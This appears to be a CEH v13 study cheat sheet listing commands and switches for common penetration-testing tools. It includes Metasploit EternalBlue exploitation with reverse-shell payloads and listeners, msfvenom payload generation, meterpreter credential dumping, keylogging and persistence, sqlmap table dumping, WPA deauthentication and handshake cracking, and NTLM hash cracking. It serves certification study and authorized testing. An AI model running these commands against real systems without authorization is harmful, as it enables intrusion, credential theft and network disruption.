# ⚡ CEH v13 — Main Tools Deep Dive (Commands & Key Switches)

## 📋 Table of Contents

- [Nmap (Network Discovery)](#-nmap---network-discovery)
- [Wireshark & tshark (Packet Analysis)](#-wireshark--tshark---packet-analysis)
- [Metasploit (Exploitation Framework)](#-metasploit---exploitation-framework)
- [sqlmap (SQL Injection)](#-sqlmap---sql-injection)
- [Burp Suite (Web Application Testing)](#-burp-suite---web-application-testing)
- [Netcat (Network Swiss Army Knife)](#-netcat---network-swiss-army-knife)
- [Hashcat (Password Cracking)](#-hashcat---password-cracking)
- [aircrack-ng (Wireless Security)](#-aircrack-ng---wireless-security)
- [Gobuster (Directory/DNS Enumeration)](#-gobuster---directorydns-enumeration)
- [Quick Command Reference](#-quick-command-reference)

---

## 🔍 Nmap - Network Discovery

**Purpose:** Discovery, port/service/version detection, OS fingerprinting, NSE scripts (vuln/discovery/brute).

### Privileges
- Many scans require root (raw sockets / SYN, OS detection). Use `sudo` for `-sS`, `-O`, `-sU` on Linux.

### Core Scan Types
- `-sS` — TCP SYN (stealth)  
- `-sT` — TCP Connect (no raw sockets)  
- `-sU` — UDP scan  
- `-sA` — ACK scan (firewall rule discovery)  
- `-sN / -sF / -sX` — Null/FIN/Xmas (stack fingerprinting / evade naive filters)  
- `-sP` or `-sn` — host discovery (ping scan; do not scan ports)

### Version / OS Detection
- `-sV` — service/version detection (probe services)  
- `--version-intensity <0-9>` — adjust depth of version probes  
- `-O` — OS detection; `--osscan-guess` to guess when unsure

### Port Selection
- `-p 22,80,443` — single/commas  
- `-p 1-65535` — full range  
- `--top-ports 100` — top N most common ports

### Timing & Performance
- `-T0` (Paranoid) .. `-T5` (Insane) — timing templates  
  - `-T4` often used for fast LAN scans (be careful on noisy networks)

### Scripts (NSE)
- `--script <script[,script,…]>` — specific scripts  
  - e.g. `--script smb-enum-shares,smb-vuln-ms17-010`  
- `--script 'vuln'` — run vulnerability category scripts  
- Script categories: `auth`, `default`, `discovery`, `intrusive`, `vuln`, `brute`, `exploit`  

**Example:**
```bash
nmap -p445 --script smb-enum-shares,smb-vuln* 10.0.0.5
```

### Output Options
- `-oN file.txt` — normal (human) output  
- `-oX file.xml` — XML  
- `-oG file.gnmap` — grepable  
- `-oA basefilename` — all of the above

### Evasion & Advanced
- `-D decoy1,decoy2,ME` — decoys  
- `-S <src-ip>` — spoof source address (may break replies)  
- `-f` — fragment packets (evasion)  
- `--data-length N` — pad packets

### Complete Example
```bash
sudo nmap -sS -sV -O -p1-65535 --version-intensity 5 --script 'vuln or auth' -T4 -oA scan-target 10.0.0.5
```

### Interpreting Port States
- **open** — service answered (potentially exploitable)
- **closed** — host answered, but port closed (not filtered)
- **filtered** — no response or blocked by firewall (Nmap can't determine open/closed)
- **open|filtered / closed|filtered** — ambiguous

---

## 📊 Wireshark & tshark - Packet Analysis

**Purpose:** Packet capture and analysis; protocol decoding.

### Capture Filters (BPF — work at capture time)
Applied by libpcap; faster; use to limit capture size.

**Examples:**
- `port 80` — capture traffic with port 80 (source or dest)
- `host 192.168.1.10` — only that host
- `net 10.0.0.0/8`
- `tcp portrange 1-1024`
- `src host 10.0.0.5 and dst port 53`

In Wireshark GUI set capture filter in the capture options; in tshark use `-f 'port 80'`.

### Display Filters (Wireshark syntax; use after capture)
More powerful; applied to loaded capture.

**Examples:**
- `ip.addr == 192.168.1.5` — either src or dst IP
- `ip.src == 192.168.1.5` — source IP only
- `tcp.port == 80` — TCP port 80
- `http.request` — show HTTP requests
- `http.request.method == "POST"`
- `http.request.uri contains "login"`
- `tcp.flags.syn == 1 && tcp.flags.ack == 0` — SYN only (new connection attempts)
- `tcp.stream eq 5` — packets in TCP stream #5 (useful for follow stream)
- `dns.qry.name == "example.com"`
- `tls.handshake.type == 1` — TLS ClientHello
- `tls.record.version == 0x0303` — TLS 1.2 records

### Common Workflows
- **Follow TCP stream:** right click packet → Follow → TCP Stream (gives reassembled payload)
- **CLI:** `tshark -z follow,tcp,ascii,5 -r file.pcap`
- **Reassemble HTTP objects:** File → Export Objects → HTTP (save files sent over HTTP)
- **Enable TCP reassembly:** Preferences → Protocols → TCP → "Allow subdissector to reassemble TCP streams"
- **Disable name resolution (faster):** View → Name Resolution (uncheck) or start with `-n` in tshark

### tshark Examples

**Capture and show HTTP requests (live):**
```bash
tshark -i eth0 -f "tcp port 80" -Y "http.request" -T fields -e ip.src -e http.request.method -e http.host -e http.request.uri
```

**Read file and extract hosts requested:**
```bash
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
```

### TLS/HTTPS Tips
- Look for SNI: `tls.handshake.extensions_server_name` or `ssl.handshake.extensions_server_name` (older filters)
- Look for certificate: `tls.handshake.certificates` or use Follow TLS stream to inspect handshake metadata
- You cannot see encrypted HTTP content without the private key or SSLKEYLOGFILE (browser key logging) or performing TLS interception with authorization.

---

## 🎯 Metasploit - Exploitation Framework

### msfconsole — Core Workflow

**Start:** `msfconsole`

**Search exploits/payloads:** `search type:exploit name:smb`

**Load exploit:** `use exploit/windows/smb/ms17_010_eternalblue`

**View options:** `show options`

**Set options:** 
```bash
set RHOSTS 10.0.0.5
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

**Launch:** `exploit` (or `exploit -j` to run as background job)

**Handle sessions:** `sessions` → `sessions -i <id>` to interact

**Background a session inside Meterpreter:** `background` (drops to msfconsole while session remains)

### Multi/handler (listener)
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.100
set LPORT 4444
exploit -j
```

### Meterpreter Quick Commands (post-exploitation)
- `sysinfo` — system details
- `getuid` — current user
- `ps` — processes
- `migrate <pid>` — move to another process
- `hashdump` — dump password hashes (requires privileges)
- `download <remote> <local>` / `upload`
- `screenshot` / `webcam_snap` (if enabled)
- `keyscan_start` / `keyscan_dump` / `keyscan_stop`

> **Note:** Many meterpreter actions require elevated privileges and are intrusive — use in authorized tests only.

### Persistence (example approach)
Use post modules to establish persistence:
```bash
use post/windows/manage/persistence
set SESSION <id>
set LHOST 10.0.0.100
run
```

### msfvenom — Payload Creation

**Basic:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.100 LPORT=4444 -f exe > shell.exe
```

**Key flags:**
- `-p` — payload
- `LHOST, LPORT` — listener host/port
- `-f` — output format (exe, elf, raw, c, aspx, war, python, etc.)
- `-a` — architecture (x86, x64)
- `-b` — badchars to avoid (e.g. `-b "\x00\x0a"`)
- `-e` — encoder (e.g. x86/shikata_ga_nai)

Redirect with `>` to write to file

---

## 💉 sqlmap - SQL Injection

**Purpose:** Automatic SQL injection discovery & exploitation.

### Basic Usage
```bash
sqlmap -u "http://example.com/page.php?id=1" --batch
```

### Important Switches
- `-u` — URL (GET)
- `--data="id=1&name=foo"` — POST data
- `--cookie="PHPSESSID=..."` — include cookies
- `--headers="User-Agent: ..."` — add headers
- `--technique=BEUSTQ` — force techniques (B=Boolean, E=Error, U=UNION, S=Stacked, T=Time, Q=Inline)
- `--dbs` — enumerate databases
- `--tables -D <db>` — list tables in DB
- `--columns -T <table> -D <db>` — list columns
- `--dump` — dump table data
- `--batch` — non-interactive (useful for scripts)
- `--risk=1-3` and `--level=1-5` — controls test intensity (higher = more requests)
- `--threads=N` — parallel requests
- `--tamper=<script>` — try evasion (space2comment, randomcase, etc.)
- `--os-shell` / `--os-pwn` — attempt OS command shell (very intrusive)

### Examples

**Enumerate DBs:**
```bash
sqlmap -u "http://example.com/item?id=1" --dbs --batch
```

**Dump a table:**
```bash
sqlmap -u "http://example.com/item?id=1" -D shopdb -T users --dump
```

---

## 🌐 Burp Suite - Web Application Testing

### Setup
1. Configure browser proxy to Burp (default 127.0.0.1:8080)
2. Install Burp CA certificate in browser to intercept HTTPS traffic

### Key Tools
- **Proxy** — intercept & modify HTTP(S) requests
- **Repeater** — craft & resend single requests (good for taming input & checking responses)
- **Intruder** — automated fuzzing / payload injection; attack types:
  - Sniper (single position, many payloads)
  - Battering ram (same payload for all positions)
  - Pitchfork (synchronized payload lists)
  - Cluster bomb (all combinations; exhaustive)
- **Scanner (Pro)** — automated vulnerability scanning
- **Sequencer** — analyze randomness of tokens
- **Decoder / Comparer / Extender**

### Typical Flow for Testing Parameter
1. Intercept request in Proxy.
2. Right-click → Send to Repeater.
3. In Repeater, modify parameter value (e.g., `' OR 1=1 --`) and Send.
4. Observe response for evidence (error, data, behavior).
5. If fuzzing, send to Intruder and set payload positions and payload lists.

---

## 🔧 Netcat - Network Swiss Army Knife

**Purpose:** Raw TCP/UDP connections, simple listeners, file transfer, banners, shells.

### Common Flags
- `-l` — listen mode
- `-p <port>` — local port
- `-v` — verbose
- `-n` — numeric-only (no DNS)
- `-z` — port scan (zero-I/O mode)
- `-e <program>` — execute program after connection (not available in all builds)

### Examples

**Simple listener:**
```bash
nc -lvnp 4444
```

**Connect to listener:**
```bash
nc 10.0.0.100 4444
```

**Port scan (fast check):**
```bash
nc -zv 10.0.0.1 22-443
```

**Transfer file:**
```bash
# sender
cat file.bin | nc -l 9000

# receiver
nc 10.0.0.1 9000 > file.bin
```

> **Note:** Using `-e` to spawn shells is powerful and dangerous. Newer nc builds often drop `-e` for security (use socat or meterpreter).

---

## 🔐 Hashcat - Password Cracking

**Purpose:** GPU-accelerated password cracking.

### Attack Modes (-a)
- `-a 0` — straight (wordlist)
- `-a 1` — combination
- `-a 3` — brute-force / mask attack
- `-a 6` — wordlist + mask (suffix)
- `-a 7` — mask + wordlist (prefix)

### Hash Types (-m) — Examples
- `0` — MD5
- `100` — SHA1
- `1000` — NTLM
- `1400` — SHA-256

*(Use `hashcat --help` or online reference for full list.)*

### Useful Flags
- `-m <hash-type>` — specify hash mode
- `-a <mode>` — attack mode
- `-o cracked.txt` — output file
- `-r rules/best64.rule` — apply rules (mutations)
- `--status --status-timer=10` — show progress every 10s
- `--session name` — resumeable session
- `--remove` — remove cracked hashes from potfile

### Examples

**NTLM with rockyou:**
```bash
hashcat -m 1000 -a 0 hashes.txt /path/to/rockyou.txt --status
```

**Mask attack (8-char alpha-num):**
```bash
hashcat -m 1000 -a 3 hashes.txt ?l?l?l?l?d?d?d?d
```

---

## 📡 aircrack-ng - Wireless Security

**Workflow:** enable monitor → capture → deauth to force handshake → crack.

### Key Utilities & Common Flags

**airmon-ng** — enable monitor mode
```bash
airmon-ng start wlan0  # creates wlan0mon (varies by distro)
```

**airodump-ng** — capture & observe networks
```bash
airodump-ng wlan0mon  # lists APs/clients
airodump-ng -c <channel> --bssid <AP_BSSID> -w capture wlan0mon  # targeted capture
```

**aireplay-ng** — inject/deauth/fakeauth
```bash
# Deauth 10 packets
aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT> wlan0mon
```

**aircrack-ng** — crack handshake (wordlist)
```bash
aircrack-ng capture-01.cap -w wordlist.txt -b <AP_BSSID>
```

### Note on hashcat Flow
Convert capture to hashcat format (e.g., cap2hccapx or hcxtools → modern mode 22000) then use hashcat to crack.

---

## 🔍 Gobuster - Directory/DNS Enumeration

**Purpose:** Find hidden directories/files, DNS subdomains.

### Directory Mode
```bash
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,html -o gobust.out
```

**Flags:**
- `-u` — URL
- `-w` — wordlist
- `-t` — threads
- `-x` — extensions

### DNS Mode (subdomain discovery)
```bash
gobuster dns -d example.com -w subdomains.txt -t 50 -o gob-dns.out
```

---

## ⚡ Quick Command Reference

### Enumerate SMB shares
```bash
enum4linux -a 10.0.0.5
# or
smbclient -L //10.0.0.5 -N
```

### Find subdomains
```bash
subfinder -d example.com -silent
```

### Port & service discovery (fast)
```bash
sudo nmap -sS -sV -T4 --top-ports 1000 -oA nmap-fast 10.0.0.0/24
```

### Full nmap deep scan
```bash
sudo nmap -sS -sV -O -p1-65535 --script 'vuln or auth' -T4 -oA nmap-deep 10.0.0.5
```

### Capture HTTP traffic (tshark)
```bash
tshark -i eth0 -f "tcp port 80" -Y "http.request" -T fields -e ip.src -e http.request.method -e http.host -e http.request.uri
```

### Start Metasploit handler
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.100
set LPORT 4444
exploit -j
```

### SQLi quick test (sqlmap)
```bash
sqlmap -u "http://example.com/item?id=1" --batch --dbs
```

### Directory brute force (gobuster)
```bash
gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
```

### WPA handshake capture & crack (quick)
```bash
# capture
airodump-ng -c 6 --bssid <AP_BSSID> -w capture wlan0mon

# deauth to speed handshake
aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT> wlan0mon

# crack
aircrack-ng capture-01.cap -w wordlist.txt -b <AP_BSSID>
```
---

- [CEH Official Courseware](https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

**Happy Ethical Hacking! 🎯**
